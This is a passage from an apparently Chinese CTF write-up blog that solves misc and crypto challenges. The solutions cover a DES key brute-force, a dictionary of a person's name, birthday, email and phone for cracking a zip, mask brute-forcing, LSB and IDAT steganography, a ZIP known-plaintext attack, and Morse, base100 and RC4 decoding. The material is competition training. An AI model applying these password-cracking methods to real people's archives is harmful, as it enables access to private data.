</span></span><span class=line><span class=cl>    <span class=k>with</span> <span class=nb>open</span><span class=p>(</span><span class=s1>&#39;2.txt&#39;</span><span class=p>,</span><span class=s1>&#39;r&#39;</span><span class=p>)</span> <span class=k>as</span> <span class=n>f</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>data</span> <span class=o>=</span> <span class=n>f</span><span class=o>.</span><span class=n>read</span><span class=p>()</span><span class=o>.</span><span class=n>split</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>item</span> <span class=ow>in</span> <span class=n>data</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>ciphertext</span> <span class=o>=</span> <span class=n>b64decode</span><span class=p>(</span><span class=n>item</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=n>KEY</span> <span class=ow>in</span> <span class=n>key_list</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>a</span> <span class=o>=</span> <span class=n>DES</span><span class=o>.</span><span class=n>new</span><span class=p>(</span><span class=n>KEY</span><span class=p>,</span> <span class=n>DES</span><span class=o>.</span><span class=n>MODE_ECB</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>plaintext</span> <span class=o>=</span> <span class=n>a</span><span class=o>.</span><span class=n>decrypt</span><span class=p>(</span><span class=n>ciphertext</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=c1># print(plaintext)</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=sa>b</span><span class=s2>&#34;FLAG&#34;</span> <span class=ow>in</span> <span class=n>plaintext</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=nb>print</span><span class=p>(</span><span class=n>plaintext</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                <span class=c1># print(f&#34;[+] 用密钥 {KEY} 解密成功:\n{plaintext}&#34;)   </span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s2>&#34;__main__&#34;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>solve</span><span class=p>()</span></span></span></code></pre></td></tr></table></div></div><h2 class=heading-element id=题目名称-带密码的zip中国铁塔内部选拔赛><span>题目名称 带密码的zip(中国铁塔内部选拔赛)</span>
<a href=#%e9%a2%98%e7%9b%ae%e5%90%8d%e7%a7%b0-%e5%b8%a6%e5%af%86%e7%a0%81%e7%9a%84zip%e4%b8%ad%e5%9b%bd%e9%93%81%e5%a1%94%e5%86%85%e9%83%a8%e9%80%89%e6%8b%94%e8%b5%9b class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h2><p><img loading=lazy src=/posts/bb1da35/imgs/image-20250821101548417.png alt=/posts/bb1da35/imgs/image-20250821101548417.png height=232 width=1498></p><p>题面信息如下：</p><blockquote><p>小明把qq密码存在了一个txt文档里，并且将其进行了zip压缩；</p><p>不过小明忘记了解压密码，只记得密码是自己个人信息的组合</p><p>你能帮小明找回密码吗？</p><p>已知：</p><p>姓名 xiaoming</p><p>生日 19901002</p><p>邮箱 <a href=mailto:xm1990@163.com target=_blank rel="external nofollow noopener noreferrer">xm1990@163.com</a></p><p>手机 13351231732</p></blockquote><p><img loading=lazy src=/posts/bb1da35/imgs/image-20250820233514709.png alt=/posts/bb1da35/imgs/image-20250820233514709.png height=1010 width=1960></p><p>根据题面信息，直接写个脚本生成字典，然后爆破压缩包密码即可</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>itertools</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>elements</span> <span class=o>=</span> <span class=p>[</span><span class=s1>&#39;xiaoming&#39;</span><span class=p>,</span> <span class=s1>&#39;19901002&#39;</span><span class=p>,</span> <span class=s1>&#39;xm1990@163.com&#39;</span><span class=p>,</span> <span class=s1>&#39;13351231732&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>all_passwords</span> <span class=o>=</span> <span class=p>[]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>r</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=nb>len</span><span class=p>(</span><span class=n>elements</span><span class=p>)</span><span class=o>+</span><span class=mi>1</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=c1># 选择大小为r的子集</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>subset</span> <span class=ow>in</span> <span class=n>itertools</span><span class=o>.</span><span class=n>combinations</span><span class=p>(</span><span class=n>elements</span><span class=p>,</span> <span class=n>r</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=c1># 对每个子集生成所有排列</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=n>perm</span> <span class=ow>in</span> <span class=n>itertools</span><span class=o>.</span><span class=n>permutations</span><span class=p>(</span><span class=n>subset</span><span class=p>):</span>
</span></span><span class=line><span class=cl>            <span class=c1># 将排列连接成一个字符串</span>
</span></span><span class=line><span class=cl>            <span class=n>password</span> <span class=o>=</span> <span class=s1>&#39;&#39;</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=n>perm</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>all_passwords</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=n>password</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;[+] 总共生成了 </span><span class=si>{</span><span class=nb>len</span><span class=p>(</span><span class=n>all_passwords</span><span class=p>)</span><span class=si>}</span><span class=s2> 种可能的密码&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>with</span> <span class=nb>open</span><span class=p>(</span><span class=s1>&#39;possible_passwords.txt&#39;</span><span class=p>,</span> <span class=s1>&#39;w&#39;</span><span class=p>)</span> <span class=k>as</span> <span class=n>f</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>p</span> <span class=ow>in</span> <span class=n>all_passwords</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>f</span><span class=o>.</span><span class=n>write</span><span class=p>(</span><span class=n>p</span> <span class=o>+</span> <span class=s1>&#39;</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>)</span></span></span></code></pre></td></tr></table></div></div><p><img loading=lazy src=/posts/bb1da35/imgs/image-20250821101430940.png alt=/posts/bb1da35/imgs/image-20250821101430940.png height=552 width=2038></p><p>输入密码解压后即可得到最后的flag：<code>nsfocus{xiaoming13351231732}</code></p><h2 class=heading-element id=题目名称-安全杂项1交通运输行业大赛><span>题目名称 安全杂项1(交通运输行业大赛)</span>
<a href=#%e9%a2%98%e7%9b%ae%e5%90%8d%e7%a7%b0-%e5%ae%89%e5%85%a8%e6%9d%82%e9%a1%b91%e4%ba%a4%e9%80%9a%e8%bf%90%e8%be%93%e8%a1%8c%e4%b8%9a%e5%a4%a7%e8%b5%9b class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h2><p>解压附件压缩包，得到一个wav音频和一个加密的压缩包</p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20250821104833581.png alt=/posts/bb1da35/imgs/image-20250821104833581.png height=894 width=1496></p><p>用audacity打开音频查看频谱图，调一下频率上下限和灰度显示</p><p>可以得到压缩包解压密码的正则</p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20250821105003952.png alt=/posts/bb1da35/imgs/image-20250821105003952.png height=1680 width=2840></p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20250821105009023.png alt=/posts/bb1da35/imgs/image-20250821105009023.png height=1680 width=2840></p><p>然后掩码爆破即可得到压缩包的解压密码：<code>Kaelin0808</code></p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20250821105026931.png alt=/posts/bb1da35/imgs/image-20250821105026931.png height=468 width=1698></p><p>用得到的密码解压后，msg.txt中的内容是一串emoji</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>👝👣👘👞👲👛👜🐰🐩👘👛👜🐪🐤🐫🐬👚🐭🐤🐮🐩👙🐯🐤🐩👝👝👛🐤👝🐭👚👚👙🐨👚🐧🐪👛👛🐪👴</span></span></code></pre></td></tr></table></div></div><p>直接base100解密即可得到最后的flag: <code>flag{de92ade3-45c6-72b8-2ffd-f6ccb1c03dd3}</code></p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20250821105123189.png alt=/posts/bb1da35/imgs/image-20250821105123189.png height=1450 width=2496></p><h2 class=heading-element id=题目名称-filepng某内部赛><span>题目名称 file.png(某内部赛)</span>
<a href=#%e9%a2%98%e7%9b%ae%e5%90%8d%e7%a7%b0-filepng%e6%9f%90%e5%86%85%e9%83%a8%e8%b5%9b class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h2><p>解压附件压缩包，得到一张file.png，直接拿zsteg扫一下</p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20250823102547525.png alt=/posts/bb1da35/imgs/image-20250823102547525.png height=1176 width=2050></p><p>发现LSB中隐写了一张PNG图片，尝试用<code>zsteg -e b3,bgr,lsb,xy file.png > out.png</code>命令导出</p><p>可以得到下面这张图片</p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20250823102655772.png alt=/posts/bb1da35/imgs/image-20250823102655772.png height=552 width=1416></p><p>010打开，发现末尾藏了一个压缩包</p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20250823102741443.png alt=/posts/bb1da35/imgs/image-20250823102741443.png height=1836 width=2804></p><p>提取出来解压或者直接在010中提取，即可得到最后的flag：<code>flag{Least_Significant_Bit_Steganography}</code></p><h2 class=heading-element id=题目名称-easy_crypto><span>题目名称 easy_crypto</span>
<a href=#%e9%a2%98%e7%9b%ae%e5%90%8d%e7%a7%b0-easy_crypto class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h2><p>解压附件压缩包，可以得到一个key.txt还有一个加密的flag.rar</p><p>key.txt中的内容如下：</p><blockquote><p>1091091153210977773210977109457732774646324677831153277464546324611511545838377321098377</p></blockquote><p>将数字分割到32-126范围上转ASCII，然后再大小写 m 转成 - ，大小写 s 转成 . ，解摩斯得到压缩包解压密码：<code>GO0DLC$K</code></p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20250823103211907.png alt=/posts/bb1da35/imgs/image-20250823103211907.png height=1748 width=2804></p><p>解压rar后得到一个多层base64套娃，循环解base64即可得到flag：<code>DASCTF{a3dcb4d229de6fde0db5686dee47145d}</code></p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20250823103458023.png alt=/posts/bb1da35/imgs/image-20250823103458023.png height=1748 width=2804></p><h2 class=heading-element id=题目名称-new><span>题目名称 new</span>
<a href=#%e9%a2%98%e7%9b%ae%e5%90%8d%e7%a7%b0-new class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h2><p>解压附件压缩包，可以得到下面这张PNG图片</p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20250823163151360.png alt=/posts/bb1da35/imgs/image-20250823163151360.png height=926 width=1416></p><p>先用zsteg梭一把，发现没有啥特别的东西</p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20250823163252179.png alt=/posts/bb1da35/imgs/image-20250823163252179.png height=1176 width=2020></p><p>然后拿stegsolve去看，发现 R0 G0 B0 都有明显LSB隐写的痕迹</p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20250823163407581.png alt=/posts/bb1da35/imgs/image-20250823163407581.png height=1116 width=1612></p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20250823163425323.png alt=/posts/bb1da35/imgs/image-20250823163425323.png height=1116 width=1612></p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20250823163439246.png alt=/posts/bb1da35/imgs/image-20250823163439246.png height=1116 width=1612></p><p>因此尝试提取图中的LSB数据，在位顺序选择LSB优先时可以发现JPG图片的文件头</p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20250823164657070.png alt=/posts/bb1da35/imgs/image-20250823164657070.png height=1456 width=2000></p><p>提取出来并删去前面多余数据后，即可得到最后的flag：<code>flag{054e676ef5f0de537ebe6604fadaf0fc}</code></p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20250823164322947.png alt=/posts/bb1da35/imgs/image-20250823164322947.png height=810 width=1520></p><blockquote><p>这道题为啥用zsteg没法识别出来jpg呢？因为题目在隐写的jpg图片前添加了一些干扰数据</p></blockquote><h2 class=heading-element id=题目名称-安全杂项10-交通运输行业大赛><span>题目名称 安全杂项10 (交通运输行业大赛)</span>
<a href=#%e9%a2%98%e7%9b%ae%e5%90%8d%e7%a7%b0-%e5%ae%89%e5%85%a8%e6%9d%82%e9%a1%b910-%e4%ba%a4%e9%80%9a%e8%bf%90%e8%be%93%e8%a1%8c%e4%b8%9a%e5%a4%a7%e8%b5%9b class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h2><p>解压附件压缩包可以得到下面这张PNG</p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20250824104656438.png alt=/posts/bb1da35/imgs/image-20250824104656438.png height=1268 width=1896></p><p>仔细观察可以发现图片下面这几行的像素是有问题的</p><p>然后我们拿zsteg扫的时候，发现也报错了，说明图片肯定是经过篡改的</p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20250824104751856.png alt=/posts/bb1da35/imgs/image-20250824104751856.png height=1176 width=2020></p><p>因此我们拿pngcheck来检查一下图片，发现图片确实是被篡改了</p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20250824104822719.png alt=/posts/bb1da35/imgs/image-20250824104822719.png height=1176 width=2020></p><p>到这里，就猜测这道题考察的可能是PNG的IDAT隐写</p><p>所以我们拿010把PNG的最后一个IDAT块提取出来，并用Cyberchef解压一下</p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20250824105034862.png alt=/posts/bb1da35/imgs/image-20250824105034862.png height=1836 width=2818></p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20250824105053395.png alt=/posts/bb1da35/imgs/image-20250824105053395.png height=1194 width=2436></p><p>解压后即可得到密文和密钥，并且密钥是8字节的</p><p>经过尝试发现RC4解密即可得到最后的flag：<code>flag{edb99a94-f84d-e175-8a7d-e7f658789447}</code></p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20250824105235178.png alt=/posts/bb1da35/imgs/image-20250824105235178.png height=1158 width=2410></p><h2 class=heading-element id=题目名称-file2><span>题目名称 file2</span>
<a href=#%e9%a2%98%e7%9b%ae%e5%90%8d%e7%a7%b0-file2 class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h2><p>解压附件压缩包，得到一个camera.png还有一个flag.zip</p><p>flag.zip中的文件如下</p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20250824181312451.png alt=/posts/bb1da35/imgs/image-20250824181312451.png height=460 width=2044></p><p>一眼明文攻击，010打开发现标志位是0x14，因此猜测是Bandizip或者WinRAR压缩的</p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20250824181522089.png alt=/posts/bb1da35/imgs/image-20250824181522089.png height=1788 width=2810></p><p>经过尝试，发现Bandizip不行，用WinRAR压缩的能正常明文攻击</p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20250824181627646.png alt=/posts/bb1da35/imgs/image-20250824181627646.png height=670 width=2050></p><p>用修改后的密码123解压即可得到flag：<code>flag{33fe6D4cE7MLd}</code></p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20250824181716085.png alt=/posts/bb1da35/imgs/image-20250824181716085.png height=1836 width=2818></p><h2 class=heading-element id=题目名称-二维码画图><span>题目名称 二维码画图</span>
<a href=#%e9%a2%98%e7%9b%ae%e5%90%8d%e7%a7%b0-%e4%ba%8c%e7%bb%b4%e7%a0%81%e7%94%bb%e5%9b%be class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h2><p>附件给了下面这张jpg</p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20250824181820652.png alt=/posts/bb1da35/imgs/image-20250824181820652.png height=916 width=1628></p><p>010打开发现末尾藏了一个文件头被篡改的rar压缩包</p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20250824181904776.png alt=/posts/bb1da35/imgs/image-20250824181904776.png height=1836 width=2810></p><p>提取出来并把文件头修复 <code>Rar!(52617221)</code> ，解压可以得到很多个0和1的嵌套目录</p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20250824182037937.png alt=/posts/bb1da35/imgs/image-20250824182037937.png height=436 width=2044></p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20250824182119059.png alt=/posts/bb1da35/imgs/image-20250824182119059.png height=1234 width=2044></p><p>目录最底层是一个 _ 文件，其中是二进制数据，根据题目名称，猜测就是二进制转二维码</p><p>写个脚本提取并转换一下</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>os</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>sys</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>PIL</span> <span class=kn>import</span> <span class=n>Image</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>dfs_traverse</span><span class=p>(</span><span class=n>current_path</span><span class=p>,</span> <span class=n>contents</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;&#34;&#34;使用DFS遍历目录并提取_文件内容&#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl>    <span class=c1># 检查当前路径是否有_文件</span>
</span></span><span class=line><span class=cl>    <span class=n>underscore_file</span> <span class=o>=</span> <span class=n>os</span><span class=o>.</span><span class=n>path</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=n>current_path</span><span class=p>,</span> <span class=s2>&#34;_&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>os</span><span class=o>.</span><span class=n>path</span><span class=o>.</span><span class=n>exists</span><span class=p>(</span><span class=n>underscore_file</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=k>with</span> <span class=nb>open</span><span class=p>(</span><span class=n>underscore_file</span><span class=p>,</span> <span class=s1>&#39;r&#39;</span><span class=p>)</span> <span class=k>as</span> <span class=n>f</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=n>contents</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=n>f</span><span class=o>.</span><span class=n>read</span><span class=p>()</span><span class=o>.</span><span class=n>strip</span><span class=p>())</span>
</span></span><span class=line><span class=cl>        <span class=k>except</span> <span class=ne>Exception</span> <span class=k>as</span> <span class=n>e</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>contents</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;Error reading </span><span class=si>{</span><span class=n>underscore_file</span><span class=si>}</span><span class=s2>: </span><span class=si>{</span><span class=nb>str</span><span class=p>(</span><span class=n>e</span><span class=p>)</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=c1># 按顺序检查0和1子目录（先0后1）</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>subdir</span> <span class=ow>in</span> <span class=p>[</span><span class=s1>&#39;0&#39;</span><span class=p>,</span> <span class=s1>&#39;1&#39;</span><span class=p>]:</span>
</span></span><span class=line><span class=cl>        <span class=n>subdir_path</span> <span class=o>=</span> <span class=n>os</span><span class=o>.</span><span class=n>path</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=n>current_path</span><span class=p>,</span> <span class=n>subdir</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>os</span><span class=o>.</span><span class=n>path</span><span class=o>.</span><span class=n>exists</span><span class=p>(</span><span class=n>subdir_path</span><span class=p>)</span> <span class=ow>and</span> <span class=n>os</span><span class=o>.</span><span class=n>path</span><span class=o>.</span><span class=n>isdir</span><span class=p>(</span><span class=n>subdir_path</span><span class=p>):</span>
</span></span><span class=line><span class=cl>            <span class=n>dfs_traverse</span><span class=p>(</span><span class=n>subdir_path</span><span class=p>,</span> <span class=n>contents</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>extract_file_contents</span><span class=p>(</span><span class=n>root_dir</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;&#34;&#34;提取目录中所有_文件的内容&#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl>    <span class=n>contents</span> <span class=o>=</span> <span class=p>[]</span>
</span></span><span class=line><span class=cl>    <span class=n>dfs_traverse</span><span class=p>(</span><span class=n>root_dir</span><span class=p>,</span> <span class=n>contents</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=s1>&#39;&#39;</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=n>contents</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
